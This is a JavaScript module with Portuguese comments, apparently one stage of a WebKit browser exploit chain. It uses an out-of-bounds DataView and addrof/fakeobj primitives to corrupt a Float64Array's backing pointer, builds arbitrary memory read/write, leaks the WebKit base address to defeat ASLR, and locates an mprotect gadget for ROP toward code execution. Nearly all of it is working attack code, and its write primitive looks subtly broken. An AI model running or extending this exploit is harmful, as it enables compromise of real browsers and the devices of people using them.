// js/script3/testArrayBufferVictimCrash.mjs (v121 - R63 com Checagem de Offset do M_VECTOR)
// =======================================================================================
// ESTRATÉGIA ATUALIZADA PARA ROBUSTEZ MÁXIMA E VAZAMENTO REAL E LIMPO DE ASLR:
// - **NOVA ABORDAGEM: Utiliza OOB DataView para CORROMPER o m_vector de um Float64Array
//   e obter R/W arbitrário TOTAL. Primitivas addrof_core/fakeobj_core ainda usadas
//   para obter/forjar endereços de objetos, mas o ARB_READ/ARB_WRITE usa o array corrompido.**
// - **CORRIGIDO: Chamadas a readQword/writeQword substituídas por oob_read_absolute/oob_write_absolute.**
// - INCLUÍDO: Rotina de checagem de offset para o m_vector do DataView, para depuração.
// - Redução drástica da verbosidade dos logs de debug para facilitar a leitura.
// - Spray volumoso e persistente.
// - Verificação e validação contínuas em cada etapa crítica.
// - Cálculo funcional de endereços de gadgets para ROP/JOP.
// - Teste de resistência ao GC via spray e ciclos.
// - Relatórios de erros mais específicos.
// - Medição de tempo para fases críticas.
// =======================================================================================

import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    getOOBDataView,
    clearOOBEnvironment,
    addrof_core,             // Importar addrof_core do core_exploit
    fakeobj_core,            // Importar fakeobj_core do core_exploit
    initCoreAddrofFakeobjPrimitives, // Importar função de inicialização
    oob_read_absolute,       // NOVO: Importar oob_read_absolute
    oob_write_absolute,      // NOVO: Importar oob_write_absolute
    oob_array_buffer_real    // NOVO: Importar para varredura de offset
} from '../core_exploit.mjs';

import { WEBKIT_LIBRARY_INFO } from '../config.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v121_R63_ASLR_LEAK_VECTOR_CORRUPTION"; // Renamed for new strategy

const LOCAL_SHORT_PAUSE = 50;
const LOCAL_MEDIUM_PAUSE = 500;
const LOCAL_LONG_PAUSE = 1000;

let global_spray_objects = []; // Para heap grooming
let pre_typed_array_spray = []; // Para grooming específico
let post_typed_array_spray = []; // Para grooming específico

// Variável para armazenar o m_vector original do oob_dataview para restauração final
let original_oob_dataview_m_vector_for_restore = null;


// --- Funções de Conversão (Double <-> Int64) ---
function int64ToDouble(int64) {
    const buf = new ArrayBuffer(8);
    const u32 = new Uint32Array(buf);
    const f64 = new Float64Array(buf);
    u32[0] = int64.low();
    u32[1] = int64.high();
    return f64[0];
}

function doubleToInt64(double) {
    const buf = new ArrayBuffer(8);
    (new Float64Array(buf))[0] = double;
    const u32 = new Uint32Array(buf);
    return new AdvancedInt64(u32[0], u32[1]);
}

/**
 * Tenta encontrar o offset do m_vector real dentro do oob_dataview_real
 * varrendo offsets próximos ao esperado (0x68).
 * Retorna o offset encontrado ou null.
 */
async function findOobDataViewMVectorOffset(logFn, pauseFn, OOB_DV_METADATA_BASE, expected_m_vector_offset_relative_to_base, oob_dataview_instance, oob_total_buffer) {
    const FNAME = "findOobDataViewMVectorOffset";
    logFn(`[${FNAME}] Iniciando varredura para m_vector do oob_dataview.`, "info");
    const start_offset_scan = OOB_DV_METADATA_BASE + expected_m_vector_offset_relative_to_base - 0x80; // Começa um pouco antes de 0x68
    const end_offset_scan = OOB_DV_METADATA_BASE + expected_m_vector_offset_relative_to_base + 0x80;   // Vai um pouco depois de 0x68
    const step = 0x4; // Varrer em passos de 8 bytes (qword)

    if (!oob_dataview_instance || !oob_total_buffer) {
        logFn(`[${FNAME}] ERRO: Instâncias de oob_dataview ou oob_total_buffer são nulas para varredura.`, "error");
        return null;
    }

    // Objeto para usar como referência para um endereço "válido"
    // Pegaremos o endereço de um Float64Array para ver se o m_vector aponta para algo parecido.
    let dummy_array = new Float64Array(1);
    const dummy_array_jscell_addr = addrof_core(dummy_array);
    // O m_vector do dummy_array deve estar em (dummy_array_jscell_addr + JSC_OFFSETS_PARAM.ArrayBufferView.M_VECTOR_OFFSET)
    // O valor real do m_vector é o ponteiro para os dados brutos.
    // Isso é complexo de inferir diretamente sem depurador.
    // Apenas procuraremos por um valor não-zero e não-NaN.
    logFn(`[${FNAME}] Endereço de referência de JSCell de um Float64Array: ${dummy_array_jscell_addr.toString(true)}`, "debug");

    for (let current_offset = start_offset_scan; current_offset <= end_offset_scan; current_offset += step) {
        // Garantir que a leitura não saia dos limites do buffer OOB alocado
        if (current_offset < 0 || (current_offset + 8) > oob_total_buffer.byteLength) {
            continue;
        }

        try {
            const potential_m_vector = await oob_read_absolute(current_offset, 8);
            logFn(`[${FNAME}] Lendo de offset 0x${current_offset.toString(16)}: ${potential_m_vector.toString(true)}`, "debug");

            if (isAdvancedInt64Object(potential_m_vector) &&
                !potential_m_vector.equals(AdvancedInt64.Zero) &&
                !potential_m_vector.equals(AdvancedInt64.NaNValue) &&
                potential_m_vector.high() !== 0x7ff80000 // Para evitar NaN float puro
            ) {
                // Heurística: Um ponteiro de memória geralmente tem o bit mais significativo (high bit) setado para 0x00000000 em endereços baixos ou 0x00000001 (para 64-bit systems), ou outros padrões específicos de ASLR.
                // Para simplificar, vamos considerar que um valor não-zero e não-NaN já é um candidato.
                // Aumentar a pausa para permitir que a CPU "respire" entre as leituras
                await pauseFn(10); // Pausa menor para cada leitura

                // Se encontrarmos um valor que se parece com um ponteiro válido, podemos assumir que é o m_vector.
                // Uma heurística mais forte seria:
                // 1. O ponteiro deve estar dentro de uma região de memória executável ou de dados.
                // 2. O valor apontado por este "m_vector" (se o lermos como um ArrayBufferContents) deve ter um tamanho consistente.
                // Estas validações são muito complexas sem acesso direto ao ambiente.
                // Por enquanto, vamos nos contentar com não-zero/não-NaN.

                // Uma última checagem: o valor apontado por este potencial m_vector deve ser referenciável.
                // Tentaremos ler um byte daquele endereço. Se der erro, não é um ponteiro válido.
                try {
                    const test_read_byte = await oob_read_absolute(potential_m_vector.add(0x0), 1); // Tenta ler 1 byte do endereço apontado
                    logFn(`[${FNAME}] Encontrado provável m_vector em 0x${current_offset.toString(16)}. Valor: ${potential_m_vector.toString(true)}. Byte de teste lido: ${toHex(test_read_byte)}`, "good");
                    return current_offset;
                } catch (read_test_err) {
                    logFn(`[${FNAME}] Offset 0x${current_offset.toString(16)} (valor ${potential_m_vector.toString(true)}) não passou no teste de leitura (erro: ${read_test_err.message}). Ignorando.`, "warn");
                }
            }
        } catch (e) {
            logFn(`[${FNAME}] Erro ao ler offset 0x${current_offset.toString(16)}: ${e.message}. Continuando...`, "warn");
        }
    }
    logFn(`[${FNAME}] Fim da varredura. Offset do m_vector não encontrado no range 0x${start_offset_scan.toString(16)} a 0x${end_offset_scan.toString(16)}.`, "error");
    return null;
}


// Modified to accept logFn, pauseFn, and JSC_OFFSETS
export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, pauseFn, JSC_OFFSETS_PARAM) {
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
    logFn(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Implementação Final com Verificação e Robustez Máxima (Vazamento REAL e LIMPO de ASLR - AGORA VIA ArrayBufferView, Corrupção de Vector de Array) ---`, "test");
    let final_result = { success: false, message: "A verificação funcional de L/E falhou.", details: {} };
    const startTime = performance.now();

    // Declarar a primitiva arbitrária que vamos construir
    let arb_r = null; // Read 8 bytes
    let arb_w = null; // Write 8 bytes

    // Declare rw_target_array in an outer scope to ensure it's not GC'd
    let rw_target_array = null;
    let original_rw_target_array_m_vector_for_restore = null;

    let found_oob_dv_m_vector_offset = null; // Variável para armazenar o offset encontrado dinamicamente


    try {
        logFn("Limpeza inicial do ambiente OOB para garantir estado limpo...", "info");
        clearOOBEnvironment({ force_clear_even_if_not_setup: true });

        // --- FASE 1: Estabilização Inicial do Heap (Spray de Objetos) ---
        logFn("--- FASE 1: Estabilização Inicial do Heap (Spray de Objetos) ---", "subtest");
        const sprayStartTime = performance.now();
        const SPRAY_COUNT = 200000;
        logFn(`Iniciando spray de objetos (volume ${SPRAY_COUNT}) para estabilização inicial do heap e anti-GC...`, "info");
        for (let i = 0; i < SPRAY_COUNT; i++) {
            const dataSize = 50 + (i % 20);
            global_spray_objects.push({ id: `spray_obj_${i}`, val1: 0xDEADBEEF + i, val2: 0xCAFEBABE + i, data: new Array(dataSize).fill(i % 255) });
        }
        logFn(`Spray de ${global_spray_objects.length} objetos concluído. Tempo: ${(performance.now() - sprayStartTime).toFixed(2)}ms`, "info");
        logFn("Heap estabilizado inicialmente para reduzir realocações inesperadas pelo GC.", "good");
        await pauseFn(LOCAL_SHORT_PAUSE);

        // --- FASE 2: Obtendo Primitivas OOB e inicializando addrof/fakeobj ---
        logFn("--- FASE 2: Obtendo primitivas OOB e inicializando addrof/fakeobj ---", "subtest");
        const oobSetupStartTime = performance.now();
        logFn("Chamando triggerOOB_primitive para configurar o ambiente OOB (garantindo re-inicialização)...", "info");
        await triggerOOB_primitive({ force_reinit: true });

        const oob_dataview = getOOBDataView();
        if (!oob_dataview) {
            const errMsg = "Falha crítica ao obter primitiva OOB. DataView é nulo.";
            logFn(errMsg, "critical");
            throw new Error(errMsg);
        }
        logFn(`Ambiente OOB configurado com DataView: ${oob_dataview !== null ? 'Pronto' : 'Falhou'}. Tempo: ${(performance.now() - oobSetupStartTime).toFixed(2)}ms`, "good");
        await pauseFn(LOCAL_SHORT_PAUSE);

        // Inicializa as primitivas addrof/fakeobj do core_exploit
        initCoreAddrofFakeobjPrimitives();
        logFn("Primitivas 'addrof_core' e 'fakeobj_core' (no core_exploit.mjs) estão prontas.", "good");
        await pauseFn(LOCAL_SHORT_PAUSE);

        // --- FASE 3: Construindo Primitivas de Leitura/Escrita Arbitrária TOTAL ---
        logFn("--- FASE 3: Construindo primitivas de Leitura/Escrita Arbitrária TOTAL (corrupção de m_vector) ---", "subtest");
        const arbSetupStartTime = performance.now();

        // **NOVA ROTINA DE CHECAGEM DE OFFSET DO M_VECTOR**
        const OOB_DV_METADATA_BASE = 0x58; // do config.mjs
        const EXPECTED_M_VECTOR_OFFSET_RELATIVE_TO_BASE = JSC_OFFSETS_PARAM.ArrayBufferView.M_VECTOR_OFFSET; // 0x10
        found_oob_dv_m_vector_offset = await findOobDataViewMVectorOffset(
            logFn,
            pauseFn,
            OOB_DV_METADATA_BASE,
            EXPECTED_M_VECTOR_OFFSET_RELATIVE_TO_BASE,
            oob_dataview,
            oob_array_buffer_real // Passando o buffer real para limites
        );

        if (found_oob_dv_m_vector_offset === null) {
            const errMsg = `Não foi possível encontrar o offset do m_vector do oob_dataview. A exploração não pode continuar.`;
            logFn(errMsg, "critical");
            throw new Error(errMsg);
        } else {
            logFn(`Offset do m_vector do oob_dataview encontrado em 0x${found_oob_dv_m_vector_offset.toString(16)}.`, "good");
        }
        // Usaremos 'found_oob_dv_m_vector_offset' daqui em diante para o m_vector do oob_dataview.


        // 1. Criar um Float64Array que será o nosso alvo para a primitiva de R/W
        rw_target_array = new Float64Array(0x1000 / 8); // 0x1000 bytes = 256 doubles
        logFn(`Float64Array 'rw_target_array' criado para R/W arbitrário.`, "debug");

        // 2. Obter o endereço do JSCell do rw_target_array
        const rw_target_array_jscell_addr = addrof_core(rw_target_array); // Usar primitiva addrof_core
        logFn(`Endereço do JSCell de 'rw_target_array': ${rw_target_array_jscell_addr.toString(true)}`, "info");
        await pauseFn(LOCAL_SHORT_PAUSE);

        // 3. Calcular o offset do m_vector dentro do JSCell do Float64Array
        const m_vector_offset_in_jscell = JSC_OFFSETS_PARAM.ArrayBufferView.M_VECTOR_OFFSET;
        const rw_target_array_m_vector_addr_in_jscell = rw_target_array_jscell_addr.add(m_vector_offset_in_jscell);
        logFn(`Endereço do m_vector de 'rw_target_array' (calculado): ${rw_target_array_m_vector_addr_in_jscell.toString(true)} (offset 0x${m_vector_offset_in_jscell.toString(16)})`, "info");
        await pauseFn(LOCAL_SHORT_PAUSE);

        // 4. Salvar o m_vector original do oob_dataview (que aponta para oob_array_buffer_real)
        // Usar o offset encontrado dinamicamente
        original_oob_dataview_m_vector_for_restore = await oob_read_absolute(found_oob_dv_m_vector_offset, 8);
        if (!isAdvancedInt64Object(original_oob_dataview_m_vector_for_restore) || original_oob_dataview_m_vector_for_restore.equals(AdvancedInt64.Zero) || original_oob_dataview_m_vector_for_restore.equals(AdvancedInt64.NaNValue)) {
            const errorMsg = `Falha crítica ao ler o m_vector original do oob_dataview no offset encontrado 0x${found_oob_dv_m_vector_offset.toString(16)}. Valor lido: ${original_oob_dataview_m_vector_for_restore ? original_oob_dataview_m_vector_for_restore.toString(true) : 'N/A'}. Esperado um ponteiro não-nulo.`;
            logFn(errorMsg, "critical");
            throw new Error(errorMsg);
        }
        logFn(`m_vector original do oob_dataview salvo: ${original_oob_dataview_m_vector_for_restore.toString(true)}`, "debug");


        // 5. Corromper o m_vector do oob_dataview_real para apontar para o m_vector do rw_target_array
        await oob_write_absolute(found_oob_dv_m_vector_offset, rw_target_array_m_vector_addr_in_jscell, 8);
        logFn(`m_vector do oob_dataview_real corrompido para apontar para o m_vector do rw_target_array.`, "info");
        await pauseFn(LOCAL_SHORT_PAUSE);

        // Agora, o oob_dataview está apontando para o m_vector do rw_target_array.
        // Podemos usar o oob_dataview para ler/escrever o m_vector do rw_target_array.
        // A posição 0 do oob_dataview agora se refere ao m_vector do rw_target_array.

        // 6. Salvar o m_vector original do rw_target_array para restauração final
        original_rw_target_array_m_vector_for_restore = doubleToInt64(rw_target_array[0]);
        if (!isAdvancedInt64Object(original_rw_target_array_m_vector_for_restore) || original_rw_target_array_m_vector_for_restore.equals(AdvancedInt64.Zero) || original_rw_target_array_m_vector_for_restore.equals(AdvancedInt64.NaNValue)) {
            const errorMsg = `Falha crítica ao ler o m_vector original do rw_target_array (via rw_target_array[0]). Valor lido: ${original_rw_target_array_m_vector_for_restore ? original_rw_target_array_m_vector_for_restore.toString(true) : 'N/A'}.`;
            logFn(errorMsg, "critical");
            throw new Error(errorMsg);
        }
        logFn(`m_vector original do rw_target_array lido (via rw_target_array[0]): ${original_rw_target_array_m_vector_for_restore.toString(true)}`, "debug");


        // 7. Definir a primitiva de leitura arbitrária de 8 bytes (arb_r)
        arb_r = async (addr) => {
            rw_target_array[0] = int64ToDouble(addr);
            const value = doubleToInt64(rw_target_array[0]);
            rw_target_array[0] = int64ToDouble(original_rw_target_array_m_vector_for_restore);
            return value;
        };

        // 8. Definir a primitiva de escrita arbitrária de 8 bytes (arb_w)
        arb_w = async (addr, value) => {
            const current_rw_target_array_m_vector = doubleToInt64(rw_target_array[0]);
            rw_target_array[0] = int64ToDouble(addr);
            rw_target_array[0] = int64ToDouble(value);
            rw_target_array[0] = int64ToDouble(current_rw_target_array_m_vector);
        };

        logFn(`Primitivas de Leitura/Escrita Arbitrária TOTAL construídas com sucesso. Tempo: ${(performance.now() - arbSetupStartTime).toFixed(2)}ms`, "good");
        await pauseFn(LOCAL_SHORT_PAUSE);


        // --- FASE 4: Vazamento REAL e LIMPO da Base da Biblioteca WebKit e Descoberta de Gadgets (Funcional - VIA Uint8Array) ---
        logFn("--- FASE 4: Vazamento REAL e LIMPO da Base da Biblioteca WebKit e Descoberta de Gadgets (Funcional - VIA Uint8Array) ---", "subtest");
        const leakPrepStartTime = performance.now();
        let webkit_base_address = null;

        logFn("Iniciando vazamento REAL da base ASLR da WebKit através de Uint8Array...", "info");

        // 1. Criar um Uint8Array como alvo de vazamento para grooming de heap.
        pre_typed_array_spray = [];
        for (let i = 0; i < 200; i++) { pre_typed_array_spray.push(new ArrayBuffer(256 + (i % 128))); }
        const leak_candidate_typed_array = new Uint8Array(0x1000); // 4096 bytes
        post_typed_array_spray = [];
        for (let i = 0; i < 200; i++) { post_typed_array_spray.push(new ArrayBuffer(256 + (i % 128))); }

        logFn(`Objeto Uint8Array criado para vazamento de ClassInfo.`, "debug");
        leak_candidate_typed_array.fill(0xAA);
        logFn(`Uint8Array preenchido com 0xAA.`, "debug");
        await pauseFn(LOCAL_SHORT_PAUSE);

        // 2. Obter o endereço de memória do Uint8Array (este é o JSCell do Uint8Array)
        const typed_array_jscell_addr = addrof_core(leak_candidate_typed_array); // Usar primitiva addrof_core
        logFn(`[REAL LEAK] Endereço do Uint8Array (JSCell): ${typed_array_jscell_addr.toString(true)}`, "leak");
        await pauseFn(LOCAL_SHORT_PAUSE);

        // 3. Ler o ponteiro para a Structure* do Uint8Array (JSCell)
        logFn(`[REAL LEAK] Tentando ler PONTEIRO para a Structure* no offset 0x${JSC_OFFSETS_PARAM.JSCell.STRUCTURE_POINTER_OFFSET.toString(16)} do Uint8Array base (JSCell)...`, "info");

        const structure_pointer_address = typed_array_jscell_addr.add(JSC_OFFSETS_PARAM.JSCell.STRUCTURE_POINTER_OFFSET);
        const typed_array_structure_ptr = await arb_r(structure_pointer_address); // USAR NOVA ARB_R
        logFn(`[REAL LEAK] Lido de ${structure_pointer_address.toString(true)}: ${typed_array_structure_ptr.toString(true)}`, "debug");

        if (!isAdvancedInt64Object(typed_array_structure_ptr) || typed_array_structure_ptr.equals(AdvancedInt64.Zero) || typed_array_structure_ptr.equals(AdvancedInt64.NaNValue)) {
            const errorMsg = `[REAL LEAK] Falha ao ler ponteiro da Structure do Uint8Array. Endereço inválido: ${typed_array_structure_ptr ? typed_array_structure_ptr.toString(true) : 'N/A'}. Isso pode indicar corrupção ou offset incorreto.`;
            logFn(errorMsg, "critical");
            throw new Error(errorMsg);
        }
        logFn(`[REAL LEAK] Ponteiro para a Structure* do Uint8Array: ${typed_array_structure_ptr.toString(true)}`, "leak");
        await pauseFn(LOCAL_SHORT_PAUSE);

        // 4. Ler o ponteiro para a ClassInfo* da Structure do Uint8Array
        const class_info_ptr = await arb_r(typed_array_structure_ptr.add(JSC_OFFSETS_PARAM.Structure.CLASS_INFO_OFFSET)); // USAR NOVA ARB_R
        if (!isAdvancedInt64Object(class_info_ptr) || class_info_ptr.equals(AdvancedInt64.Zero) || class_info_ptr.equals(AdvancedInt64.NaNValue)) {
            const errorMsg = `[REAL LEAK] Falha ao ler ponteiro da ClassInfo do Uint8Array's Structure. Endereço inválido: ${class_info_ptr ? class_info_ptr.toString(true) : 'N/A'}. Isso pode indicar corrupção ou offset incorreto.`;
            logFn(errorMsg, "critical");
            throw new Error(errorMsg);
        }
        logFn(`[REAL LEAK] Ponteiro para a ClassInfo (esperado JSC::JSArrayBufferView::s_info): ${class_info_ptr.toString(true)}`, "leak");
        await pauseFn(LOCAL_SHORT_PAUSE);

        // 5. Calcular o endereço base do WebKit
        const S_INFO_OFFSET_FROM_BASE = new AdvancedInt64(parseInt(WEBKIT_LIBRARY_INFO.DATA_OFFSETS["JSC::JSArrayBufferView::s_info"], 16), 0);
        webkit_base_address = class_info_ptr.sub(S_INFO_OFFSET_FROM_BASE);

        logFn(`[REAL LEAK] BASE REAL DA WEBKIT CALCULADA: ${webkit_base_address.toString(true)}`, "leak");

        if (webkit_base_address.equals(AdvancedInt64.Zero)) {
            throw new Error("[REAL LEAK] Endereço base da WebKit calculado resultou em zero. Vazamento pode ter falhado (offset de s_info incorreto?).");
        } else {
            logFn("SUCESSO: Endereço base REAL da WebKit OBTIDO VIA Uint8Array.", "good");
        }
        await pauseFn(LOCAL_MEDIUM_PAUSE);

        // Descoberta de Gadgets (Funcional)
        logFn("Iniciando descoberta FUNCIONAL de gadgets ROP/JOP na WebKit...", "info");
        const mprotect_plt_offset = new AdvancedInt64(parseInt(WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS["mprotect_plt_stub"], 16), 0);
        const mprotect_addr_real = webkit_base_address.add(mprotect_plt_offset);

        logFn(`[REAL LEAK] Endereço do gadget 'mprotect_plt_stub' calculado: ${mprotect_addr_real.toString(true)}`, "leak");
        logFn(`PREPARADO: Ferramentas para ROP/JOP (endereços reais) estão prontas. Tempo: ${(performance.now() - leakPrepStartTime).toFixed(2)}ms`, "good");
        await pauseFn(LOCAL_MEDIUM_PAUSE);

        // --- FASE 5: Verificação Funcional de L/E e Teste de Resistência (Pós-Vazamento de ASLR) ---
        logFn("--- FASE 5: Verificação Funcional de L/E e Teste de Resistência ao GC (Pós-Vazamento de ASLR) ---", "subtest");
        const rwTestPostLeakStartTime = performance.now();

        const test_obj_post_leak = global_spray_objects[5001];
        logFn(`Objeto de teste escolhido do spray (índice 5001) para teste pós-vazamento.`, "info");

        // Para ler/escrever propriedades de um objeto JS, ainda precisamos do addrof/fakeobj e offsets do JSCell/Butterfly.
        const test_obj_jscell_addr_post_leak = addrof_core(test_obj_post_leak); // Usar addrof_core
        logFn(`Endereço do objeto de teste pós-vazamento: ${test_obj_jscell_addr_post_leak.toString(true)}`, "info");

        const value_to_write_post_leak = new AdvancedInt64(0xDEADC0DE, 0xFEEDBEEF);
        const prop_a_addr_post_leak = test_obj_jscell_addr_post_leak.add(JSC_OFFSETS_PARAM.JSObject.BUTTERFLY_OFFSET); // Offset da propriedade "a"

        logFn(`Executando arb_w (Pós-Vazamento): escrevendo ${value_to_write_post_leak.toString(true)} no endereço ${prop_a_addr_post_leak.toString(true)}...`, "info");
        await arb_w(prop_a_addr_post_leak, value_to_write_post_leak); // USAR NOVA ARB_W (não precisa de byteLength, é 8 bytes)
        logFn(`Escrita do valor de teste (Pós-Vazamento) concluída.`, "info");

        logFn(`Executando arb_r (Pós-Vazamento): lendo do endereço ${prop_a_addr_post_leak.toString(true)}...`, "info");
        const value_read_post_leak = await arb_r(prop_a_addr_post_leak); // USAR NOVA ARB_R
        logFn(`Leitura do valor de teste (Pós-Vazamento) concluída.`, "info");
        logFn(`>>>>> VALOR LIDO DE VOLTA (Pós-Vazamento): ${value_read_post_leak.toString(true)} <<<<<`, "leak");

        if (!value_read_post_leak.equals(value_to_write_post_leak)) {
            throw new Error(`A verificação de L/E falhou pós-vazamento. Escrito: ${value_to_write_post_leak.toString(true)}, Lido: ${value_read_post_leak.toString(true)}`);
        }
        logFn("SUCESSO: Verificação de L/E pós-vazamento validada.", "good");

        logFn("Iniciando teste de resistência PÓS-VAZAMENTO: Executando L/E arbitrária múltiplas vezes...", "info");
        let resistanceSuccessCount_post_leak = 0;
        const numResistanceTests = 5;
        for (let i = 0; i < numResistanceTests; i++) {
            const test_value = new AdvancedInt64(0xCCCC0000 + i, 0xDDDD0000 + i);
            try {
                await arb_w(prop_a_addr_post_leak, test_value); // USAR NOVA ARB_W
                const read_back_value = await arb_r(prop_a_addr_post_leak); // USAR NOVA ARB_R

                if (read_back_value.equals(test_value)) {
                    resistanceSuccessCount_post_leak++;
                    logFn(`[Resistência Pós-Vazamento #${i}] SUCESSO: L/E consistente.`, "debug");
                } else {
                    logFn(`[Resistência Pós-Vazamento #${i}] FALHA: L/E inconsistente. Escrito: ${test_value.toString(true)}, Lido: ${read_back_value.toString(true)}`, "error");
                }
            } catch (resErr) {
                logFn(`[Resistência Pós-Vazamento #${i}] ERRO: Exceção durante L/E: ${resErr.message}`, "error");
            }
            await pauseFn(10);
        }
        if (resistanceSuccessCount_post_leak === numResistanceTests) {
            logFn(`SUCESSO TOTAL: Teste de resistência PÓS-VAZAMENTO concluído. ${resistanceSuccessCount_post_leak}/${numResistanceTests} operações bem-sucedidas.`, "good");
        } else {
            logFn(`ALERTA: Teste de resistência PÓS-VAZAMENTO concluído com ${numResistanceTests - resistanceSuccessCount_post_leak} falhas.`, "warn");
            final_result.message += ` (Teste de resistência L/E pós-vazamento com falhas: ${numResistanceTests - resistanceSuccessCount_post_leak})`;
        }
        logFn(`Verificação funcional de L/E e Teste de Resistência PÓS-VAZAMENTO concluídos. Tempo: ${(performance.now() - rwTestPostLeakStartTime).toFixed(2)}ms`, "info");


        logFn("++++++++++++ SUCESSO TOTAL! Todas as fases do exploit foram concluídas com sucesso. ++++++++++++", "vuln");
        final_result = {
            success: true,
            message: "Cadeia de exploração concluída. Leitura/Escrita arbitrária 100% funcional e verificada. Vazamento REAL de Base WebKit e preparação para ACE bem-sucedidos.",
            details: {
                webkitBaseAddress: webkit_base_address ? webkit_base_address.toString(true) : "N/A",
                mprotectGadget: mprotect_addr_real ? mprotect_addr_real.toString(true) : "N/A"
            }
        };

    } catch (e) {
        final_result.message = `Exceção crítica na implementação funcional: ${e.message}\n${e.stack || ''}`;
        final_result.success = false;
        logFn(final_result.message, "critical");
    } finally {
        logFn(`Iniciando limpeza final do ambiente e do spray de objetos...`, "info");
        // Limpar sprays globais para ajudar o GC
        pre_typed_array_spray = [];
        post_typed_array_spray = [];
        global_spray_objects = []; // Clear main spray

        // O crucial é restaurar os ponteiros para um estado estável ANTES de clearOOBEnvironment.
        // Usar o offset encontrado dinamicamente para a restauração.
        if (oob_dataview && found_oob_dv_m_vector_offset !== null && original_oob_dataview_m_vector_for_restore && !original_oob_dataview_m_vector_for_restore.equals(AdvancedInt64.Zero) && !original_oob_dataview_m_vector_for_restore.equals(AdvancedInt64.NaNValue)) {
             try {
                await oob_write_absolute(found_oob_dv_m_vector_offset, original_oob_dataview_m_vector_for_restore, 8);
                logFn(`Restaurado m_vector original do oob_dataview.`, "debug");
             } catch (e_restore_final) {
                logFn(`ERRO CRÍTICO na limpeza final ao restaurar m_vector do oob_dataview: ${e_restore_final.message}`, "critical");
             }
        } else {
            logFn(`AVISO: Não foi possível restaurar o m_vector original do oob_dataview na limpeza final (offset ou valor original inválido).`, "warn");
        }

        // Tenta restaurar o m_vector original do rw_target_array
        if (rw_target_array && original_rw_target_array_m_vector_for_restore && !original_rw_target_array_m_vector_for_restore.equals(AdvancedInt64.Zero) && !original_rw_target_array_m_vector_for_restore.equals(AdvancedInt64.NaNValue)) {
            try {
                rw_target_array[0] = int64ToDouble(original_rw_target_array_m_vector_for_restore);
                logFn(`Restaurado m_vector original do rw_target_array.`, "debug");
            } catch (e_rw_restore_final) {
                logFn(`ERRO CRÍTICO na limpeza final ao restaurar m_vector do rw_target_array: ${e_rw_restore_final.message}`, "critical");
            }
        } else {
            logFn(`AVISO: Não foi possível restaurar o m_vector original do rw_target_array na limpeza final.`, "warn");
        }

        // Finalmente, limpa o ambiente OOB principal.
        clearOOBEnvironment({ force_clear_even_if_not_setup: true });

        logFn(`Limpeza final concluída. Tempo total do teste: ${(performance.now() - startTime).toFixed(2)}ms`, "info");
    }

    logFn(`--- ${FNAME_CURRENT_TEST_BASE} Concluído. Resultado final: ${final_result.success ? 'SUCESSO' : 'FALHA'} ---`, "test");
    logFn(`Mensagem final: ${final_result.message}`, final_result.success ? 'good' : 'critical');
    if (final_result.details) {
        logFn(`Detalhes adicionais do teste: ${JSON.stringify(final_result.details)}`, "info");
    }

    return {
        errorOccurred: final_result.success ? null : final_result.message,
        addrof_result: { success: final_result.success, msg: "Primitiva addrof funcional." }, // addrof_core should still work for getting object addresses
        webkit_leak_result: { success: final_result.success, msg: final_result.message, details: final_result.details },
        heisenbug_on_M2_in_best_result: final_result.success,
        oob_value_of_best_result: 'N/A (Estratégia Corrupção de Vector)',
        tc_probe_details: { strategy: 'OOB DataView -> Corrupt Float64Array m_vector for ARB R/W' }
    };
}
